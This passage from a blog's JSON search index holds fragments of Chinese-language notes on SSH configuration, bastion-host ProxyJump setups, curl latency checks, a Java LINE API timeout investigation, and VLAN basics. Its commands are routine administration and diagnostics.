第二視窗一樣要做這個選項，登入就不需要密碼了。 ","date":"2022-02-13","objectID":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/:2:0","tags":["ssh","sshconfig"],"title":"ssh 使用 ControlMaster 做第二連線自動登入(xshell,putty)","uri":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/"},{"categories":["Linux"],"content":"xshell ","date":"2022-02-13","objectID":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/:3:0","tags":["ssh","sshconfig"],"title":"ssh 使用 ControlMaster 做第二連線自動登入(xshell,putty)","uri":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/"},{"categories":["Linux"],"content":"方法1 xshell克隆一個新的終端:shift + alt + t 參考連結：xshell克隆會話_Marion的博客-CSDN博客_xshell 複製會話 ","date":"2022-02-13","objectID":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/:3:1","tags":["ssh","sshconfig"],"title":"ssh 使用 ControlMaster 做第二連線自動登入(xshell,putty)","uri":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/"},{"categories":["Linux"],"content":"方法2 Windows篇 利用xshell和SecureCRT session clone的思路，以xshell為例。對跳板機的會話屬性做如下設置： 1. 在會話屬性--連接--用戶身份驗證中的方法，選擇keyboard Interactive，輸入用戶名和密碼。 2. 這樣登陸時，密碼都可省略，直接輸入token即可。 3. 在已經登陸的session上，右鍵點擊tab頁，選擇複製ssh渠道，就可以免token無限複製啦。 參考:登陸跳板機每天只輸入一次token的方法——ssh clone session - Solon Tan - 博客園 這邊看起來要用 私鑰登入 ","date":"2022-02-13","objectID":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/:3:2","tags":["ssh","sshconfig"],"title":"ssh 使用 ControlMaster 做第二連線自動登入(xshell,putty)","uri":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/"},{"categories":["Linux"],"content":"ssh autocomplete _complete_ssh_hosts () { COMPREPLY=() cur=\"${COMP_WORDS[COMP_CWORD]}\" comp_ssh_hosts=`cat ~/.ssh/known_hosts | \\ cut -f 1 -d ' ' | \\ sed -e s/,.*//g | \\ grep -v ^# | \\ uniq | \\ grep -v \"\\[\" ; cat ~/.ssh/config | \\ grep \"^Host \" | \\ awk '{print $2}' ` COMPREPLY=( $(compgen -W \"${comp_ssh_hosts}\" -- $cur)) return 0 } complete -F _complete_ssh_hosts ssh 上面加在 .profile 就可以開心始用。:D 參考:Add auto complete to your ssh, put into your .bash_profile ","date":"2022-02-13","objectID":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/:4:0","tags":["ssh","sshconfig"],"title":"ssh 使用 ControlMaster 做第二連線自動登入(xshell,putty)","uri":"/blog/posts/ssh-%E4%BD%BF%E7%94%A8-ControlMaster-%E5%81%9A%E7%AC%AC%E4%BA%8C%E9%80%A3%E7%B7%9A%E8%87%AA%E5%8B%95%E7%99%BB%E5%85%A5-xshell-putty/"},{"categories":["Linux"],"content":"一般我們在 ssh 連線都會用 putty，但是在多台機器管理上不是很方便，所以回換成 xshell 相關工具做連線查詢，最近在做Bastion Host，發現ssh 也可以做到簡單管理設定，這邊就做個筆記。 首先，可以在 .ssh/config 做多個 ssh 連線設定，裡面設定值不分大小寫，可看官網文件。SSH config file syntax and how-tos for configuring the OpenSSH client The possible keywords and their meanings are as follows (note that keywords are case-insensitive and arguments are case-sensitive): ","date":"2022-02-13","objectID":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:0:0","tags":["ssh","sshconfig"],"title":"sshconfig 設定小記","uri":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"常用設定 # - master Host master # 代號 Hostname 192.168.11.24 # IP or Domain name Port 2222 # 指定埠口 User jonny # 使用者名稱 identityfile ~/.ssh/id_rsa_24 # 指定金鑰 # - slave Host slave # 代號 Hostname 192.168.11.25 # IP or Domain name Port 2223 # 指定埠口 User jonny # 使用者名稱 identityfile ~/.ssh/id_rsa_25 # 指定金鑰 參考:增進 SSH 使用效率 - ssh_config · 完全用 GNU/Linux 工作 有看到有人會做編排，在排版上面會比較好處理。 Host slave # 代號 Hostname 192.168.11.25 # IP or Domain name Port 2223 # 指定埠口 User jonny # 使用者名稱 identityfile ~/.ssh/id_rsa_25 # 指定金鑰 ","date":"2022-02-13","objectID":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:1:0","tags":["ssh","sshconfig"],"title":"sshconfig 設定小記","uri":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"詳細設定 有做過ControlMaster 設定，可以參考 這篇。 官網其他設定可以看SSH config file syntax and how-tos for configuring the OpenSSH client ","date":"2022-02-13","objectID":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:1:1","tags":["ssh","sshconfig"],"title":"sshconfig 設定小記","uri":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"其他應用 有看到How to setup SSH config ：使用 SSH 設定檔簡化指令與連線網址 | by awonwon | 浦島太郎的水族缸 | Medium，這篇可以用設定 ssh 連線，在做 git 不需要打那麼長。 剩下有看到什麼在補這邊 ","date":"2022-02-13","objectID":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:2:0","tags":["ssh","sshconfig"],"title":"sshconfig 設定小記","uri":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"金鑰管理 我一直在想為什麼 ssh 連線會自動吃.ssh/id_rsa檔案，但是雖然可以產生別的 key，但我最近在想是不是使用 Linux帳號去管理這件事會比較好?因為切換帳號可以直接ssh 連線，然後正常安裝程式也會建議使用該程式帳號去做建置，這可能是我目前想到比較好作法。 ","date":"2022-02-13","objectID":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:3:0","tags":["ssh","sshconfig"],"title":"sshconfig 設定小記","uri":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"ssh autocomplete _complete_ssh_hosts () { COMPREPLY=() cur=\"${COMP_WORDS[COMP_CWORD]}\" comp_ssh_hosts=`cat ~/.ssh/known_hosts | \\ cut -f 1 -d ' ' | \\ sed -e s/,.*//g | \\ grep -v ^# | \\ uniq | \\ grep -v \"\\[\" ; cat ~/.ssh/config | \\ grep \"^Host \" | \\ awk '{print $2}' ` COMPREPLY=( $(compgen -W \"${comp_ssh_hosts}\" -- $cur)) return 0 } complete -F _complete_ssh_hosts ssh 上面加在 .profile 就可以開心始用。:D 參考:Add auto complete to your ssh, put into your .bash_profile 相關連結 教你高效使用SSH 的16 个技巧_shinepaopao-CSDN博客 ","date":"2022-02-13","objectID":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/:4:0","tags":["ssh","sshconfig"],"title":"sshconfig 設定小記","uri":"/blog/posts/sshconfig-%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近參照主機操作文件建置 Bastion Host，常常 ssh 登入主機，覺得操作上不是很方便，所以後來改用 Xshell,Pietty(putty) 連線 Linux 主機，發現 ssh 也滿強的。 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:0:0","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"你可能需要懂的東西 [教學] 產生SSH Key並且透過KEY進行免密碼登入 | 辛比誌 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:1:0","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"sshconfig SSH config file syntax and how-tos for configuring the OpenSSH client ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:1:1","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"ssh-agent ssh转发代理：ssh-agent用法详解 - 骏马金龙 - 博客园 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:1:2","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"方式 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:2:0","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"ssh-agent forward(不推薦) 這個方法有風險，所以不推薦使用。可以參考這篇淺談 SSH agent forwarding 和 proxy command 的安全風險與應用 « Nic Lin’s Blog，有詳細說明。 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:2:1","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"ProxyCommand 這個在網站看到有很多不同寫法。我在嘗試不知道要用哪一個…，也不知道他們之間的差異，不過後來看到這篇ssh命令之ProxyCommand選項 | dslztx 備份圖，裡面有詳細講到差異，這邊有興趣的人可以看一下。 Host PI1 User pi Hostname 192.168.1.201 Host PI2 User pi Hostname 192.168.1.202 ProxyCommand ssh -W %h:%p PI1 這邊要注意要改 ProxyCommand 的PI1，無腦貼可能不能跑。所以還是推薦使用 ProxyJump ，還算滿方便的。 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:2:2","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"ProxyJump sshconfig 使用上非常簡單，把 ssh host 加在 ProxyJump 就完事了。 Host PI1 User pi Hostname 192.168.1.201 Host PI2 User pi Hostname 192.168.1.202 ProxyJump PI1 一般指令 ssh -J pi@192.168.1.201 pi@192.168.1.202 後來看到可以做多個跳板方式，使用,分隔就能做到。 ssh -J pi@192.168.1.201,pi@192.168.1.202 pi@192.168.1.203 參考: 使用 ssh Proxyjump | Nyo’s Study Book scp scp scp -o 'ProxyJump jump.host' myfile.txt dist.host:/my/dir 當然有設定 ssh_config 也能直接做 scp 動作。 scp a.sh PI2:~ 參考:SSH to remote hosts though a proxy or bastion with ProxyJump | Enable Sysadmin 之前用winscp做 ssh tunnel 只能跳一層，但這個應該可以無限跳。可以參考ssh port forward連MySQL方法(SSH Tunnel) | 程式狂想筆記 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:2:3","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"相關文章 Day 12 - 使用 CDK 部署 Bastion Host 防禦主機！ - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 安全地利用 Bastion Host 跳轉. Create secure SSH connection via… | by HsuCheng Tseng | Medium 認識 Bastion Host 部署管理機 - Yi Yang’s Blog 淺談 SSH agent forwarding 和 proxy command 的安全風險與應用 « Nic Lin’s Blog ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:3:0","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"vagrant 測試 ProxyJump 功能 本來想用網路上寫好的 vm 測試，但後來發現不用，想側功能直接 JUMP 自己連自己就好啦XDD。VM測試我目前還沒有想到怎麼隔離內網連電腦問題，可能專業虛擬環境才有辦法。 ssh -J pi@192.168.1.201,pi@192.168.1.201 pi@192.168.1.201 jcoetsie/bastion_exercise: Learn how a bastion works using vagrant and virtualbox vverecke/proxycommand_demo: Automatically sets up a development environment using Vagrant and Ansible to demonstrate the usage of bastion hosts. 這邊選擇可橋接網路 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:4:0","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["Linux"],"content":"為什麼這個安全與我的心得 如果不走 VPN，就需要開通從外網走 22 port 進目標 AWS EC2 主機的連線。就算有白名單的限制，這樣寬鬆的設定並不算安全，在此我們可以利用俗稱 Bastion Host 的中繼主機當跳板，如此甚至可以只在需要時打開跳板主機，進而完全隔離外網。這篇文章將介紹如何安全地穿過跳板連上目標主機，以及可能發生的問題。 參考: 安全地利用 Bastion Host 跳轉. Create secure SSH connection via… | by HsuCheng Tseng | Medium 上面文章有簡單說明，我自己也有思考為什麼這個會比較安全，一般公司都會設好VPN，但連進去網路可能就跟公司同網段，在這樣情況下駭進去第一台電腦就可以針對該網段做動作(scan ip 或 抓該電腦資料)。如果我使用 Bastion Host 作法，就算外層被駭進去，把內部網段與 Bastion Host 隔離開，這樣安全性也會比較高。 使用 Bastion Host 這個方式可以在跳板主機不惠存到連線方式，這個還滿特別的。我目前三份工作，公司沒有使用到 Bastion Host 這種方法，但是有跳板主機概念。 在公司內部網路 ssh linux 主機後，再 ssh 另外一台主機，複製檔案也超麻煩的。 我之前有用過SSH Tunnel，仔細想想這個也可以用 ProxyJump 做連線操作。 VPN 登入進去後，遠端(mstsc) Window 跳板主機，該跳板主機有相關xshell 可進行連線操作 Bastion Host 我有爬到網路，可以安裝SELINUX環境下，因為這樣權限會比較嚴謹，可能會比較安全。 ","date":"2022-02-13","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/:5:0","tags":["ssh","bastion","sshconfig"],"title":"使用 Bastion Host 方式ssh方式登入主機","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Bastion-Host-%E6%96%B9%E5%BC%8Fssh%E6%96%B9%E5%BC%8F%E7%99%BB%E5%85%A5%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"因為最近 Line 測試 API，有少數情況會 connection timed out，所以簡單測試是不是打 API 會不會 timedout ，測試發現會失敗。 ","date":"2022-02-13","objectID":"/blog/posts/curl-%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E7%B6%B2%E8%B7%AF%E6%98%AF%E5%90%A6%E5%BB%B6%E9%81%B2/:0:0","tags":["curl"],"title":"curl 簡單測試網路是否延遲","uri":"/blog/posts/curl-%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E7%B6%B2%E8%B7%AF%E6%98%AF%E5%90%A6%E5%BB%B6%E9%81%B2/"},{"categories":["網路"],"content":"方法一 (我使用這個) for i in `seq 100`; do curl -o /dev/null -s -w %{http_code}:%{time_total} http://www.baidu.com;echo \" \"; done 參考：使用shell 脚本做简单的压力测试_ISaiSai的专栏-CSDN博客_shell压力测试脚本 ","date":"2022-02-13","objectID":"/blog/posts/curl-%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E7%B6%B2%E8%B7%AF%E6%98%AF%E5%90%A6%E5%BB%B6%E9%81%B2/:1:0","tags":["curl"],"title":"curl 簡單測試網路是否延遲","uri":"/blog/posts/curl-%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E7%B6%B2%E8%B7%AF%E6%98%AF%E5%90%A6%E5%BB%B6%E9%81%B2/"},{"categories":["網路"],"content":"方法二 參考：shell script web 壓力測試 for i in {1..30} do s=\"$s\\n$i\" done echo -e $s | xargs -n 1 -P8 -I% curl -w \"@curl-format.txt\" -I -k \"https://www.yourhost.com/path?offset=0\u0026limit=10\" --max-time 30 2\u003e\u00261 curl-format.txt http_code: %{http_code}\\n time_namelookup: %{time_namelookup}\\n time_connect: %{time_connect}\\n time_appconnect: %{time_appconnect}\\n time_pretransfer: %{time_pretransfer}\\n time_redirect: %{time_redirect}\\n time_starttransfer: %{time_starttransfer}\\n ----------\\n time_total: %{time_total}\\n 我本來找有沒有類似 TLS 相關解析測試，不過沒看到。想找類似這樣 ","date":"2022-02-13","objectID":"/blog/posts/curl-%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E7%B6%B2%E8%B7%AF%E6%98%AF%E5%90%A6%E5%BB%B6%E9%81%B2/:2:0","tags":["curl"],"title":"curl 簡單測試網路是否延遲","uri":"/blog/posts/curl-%E7%B0%A1%E5%96%AE%E6%B8%AC%E8%A9%A6%E7%B6%B2%E8%B7%AF%E6%98%AF%E5%90%A6%E5%BB%B6%E9%81%B2/"},{"categories":["Java"],"content":"遇到問題 最近公司發現發 LINE 推播時候發現 log 會有失敗 Exception，仔細看了一下訊息寫connection timed out，到底為什麼發生這個問題，是系統？是網路？是路由器？由於不是100%會發生，最好狀況沒發生，最高一天發生6次失敗，一天的量最多大概200多，所以失敗機率雖低，但這個遇到的情況還滿高的。這邊我蒐集一些方法，順便紀錄一下。 ","date":"2022-02-13","objectID":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/:1:0","tags":["java","timeout"],"title":"Java 遇到 connection timed out 問題","uri":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"函示庫問題 程式出現 connection timed out，有查看程是Exception 原因，可參考淺談Java中的TCP超時。 程式建立TCP連線時候，沒有收到ACK回應，導致connection timed out。 我們程式使用Line 開發Java 推播函示庫，裡面原始碼就有設定 timeout 10秒鐘(程式連結)，因為連線超過10秒鐘沒有回應，所以就發生 connection timed out。 我們測試連線大概有4%機率會發生超過10秒鐘或連線失敗。 TODO: 淺談Java中的TCP超時 | 程序員，川流不息 ","date":"2022-02-13","objectID":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/:1:1","tags":["java","timeout"],"title":"Java 遇到 connection timed out 問題","uri":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"找到排除方法 ","date":"2022-02-13","objectID":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/:2:0","tags":["java","timeout"],"title":"Java 遇到 connection timed out 問題","uri":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"TCP 超量 linux上TCP connection timeout的原因查找_沧海一粟-CSDN博客_linux tcp timeout 一次HTTP connect-timeout的排查(上) - 简书 彻底理解connection timeout - 簡書 這邊我原本也滿擔心，因為我們公司是多個團隊用共用主機，想說別的專案會有大量呼叫 API。不過我看使用量好像還好，大概 100 建立多個連線，大部分專案沒有做外連動作，所以排除掉。 可參考Windows / Linux 如何查詢連線數量(connections \u0026 sessions) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天指令: # Linux: # 看全部: netstat -aunt | wc -l # 只看 TCP: netstat -ant | wc -l # 只看 UDP: netstat -aut | wa -l # Windows: # 只看TCP: netstat -an | find \"TCP\" /c # 只看UDP: netstat -an | find \"UDP\" /c ","date":"2022-02-13","objectID":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/:2:1","tags":["java","timeout"],"title":"Java 遇到 connection timed out 問題","uri":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"MTR 測試 因為最近剛好問我朋友 vLan 問題，剛好順便問我朋友也是做網路相關工作，他有先試著叫我做ping主機動作，不過我有問我大量ping情況會發生，有什麼方法看網路這一塊哪邊問題，我朋友跟我講一個工具，MTR工具，他們通常會請客戶端測試用。 上圖，倒數第二跳好像滿高的!!不過我朋友說，不一定有問題，因為正常中間 loss 很多的話最後應該也會滿多，推測我們公司的 ISP 選的路線可能非最佳路線，像他幫我測試用中華電信 ISP 線路 PING 沒有這麼高(如下圖)，所以問題應該是出在ISP和 LINE 雲端服務商機率比較大。 我朋友提供一些方案，因為我們 ISP 公司不一樣，所以解析出來 DNS 的 IP 也不一樣，所以有建議我改 host 檔案指定中華 DNS 出來 IP，可以先看打API會有掉包問題，不過目前我應該沒有這個權限，我有先請我們公司同仁先看，後續有消息會再補上。不過我有先MTR到中華解析出來 IP ，ping還滿好的。 經典聊天紀錄留一下。 網路這一塊滿深奧XD。 ","date":"2022-02-13","objectID":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/:2:2","tags":["java","timeout"],"title":"Java 遇到 connection timed out 問題","uri":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/"},{"categories":["Java"],"content":"Line 主要找到 timeout 設定地方 預設 10 秒會 timeout。 line-bot-sdk-java/LineMessagingClientBuilder.java at cbcb096023f2de84684751839656a0c458f6ee41 · line/line-bot-sdk-java · GitHub line-bot-sdk-java/LineClientConstants.java at cbcb096023f2de84684751839656a0c458f6ee41 · line/line-bot-sdk-java · GitHub ","date":"2022-02-13","objectID":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/:3:0","tags":["java","timeout"],"title":"Java 遇到 connection timed out 問題","uri":"/blog/posts/Java-%E9%81%87%E5%88%B0-connection-timed-out-%E5%95%8F%E9%A1%8C/"},{"categories":["網路"],"content":"最近我想做無聊 Switch-lan-play 實驗，想建立VM做 vlan網路切割，最後還是失敗了。我參考Linux下vlan的学习（下） | 污力大熊的博客，這篇實作，其實我文本想說照著上面做，我應該可以不用了解太多就能做出環境，但最後失敗了，我有想到一些問題，因為我一直沒有想到我虛擬的另外一端要接什麼東西，就是下面那朵雲。 最後有請教我朋友一些問題，整理相關紀錄。我不是網路工程師，所以這邊筆記會比較簡短易懂，不會有太專業教學內容，所以可能內容有不完整。 ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:0:0","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"vLan 概念 簡單來說，就是一台Switch 可以分成兩個 Switch，這樣講很抽像，簡單切出來個 vLan，他們廣播封包不會推到另一個vLan，完成實體切割。當下聽到這個覺得不做 vLan也能做到相同事情？但在安全性就有差了，原因相同網路做可自由更改 IP ，就能做到接到別的網域資料，這有安全性的問題。透過 vLan 可以解決這個問題。 可以參考：VLAN Explained - YouTube ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:0:1","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"Trunk 概念 網路上看到 Trunk 出去會把 封包加上 tag，進來封包會把 vLan tag 拔掉。 ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:1:0","tags":["vlan","switch","router"],"title":"vLan 一些知識小記","uri":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/"},{"categories":["網路"],"content":"Trunk 連接的設備 Switch 另一接頭也需要設定 Trunk。 Router 通過子介面設定，這邊跟 Switch 方式有點不同。 這邊同學給我 Fortigate 50B 防火牆，這邊設備等級類似 Router，所以看到介面沒需要設定 tagged之類的設定。 這邊看上面圖沒有設定 Tag 之類。 ","date":"2022-02-13","objectID":"/blog/posts/vLan-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AD%98%E5%B0%8F%E8%A8%98/:1:1","tags":["vlan","switch","router"],"title":"vLan 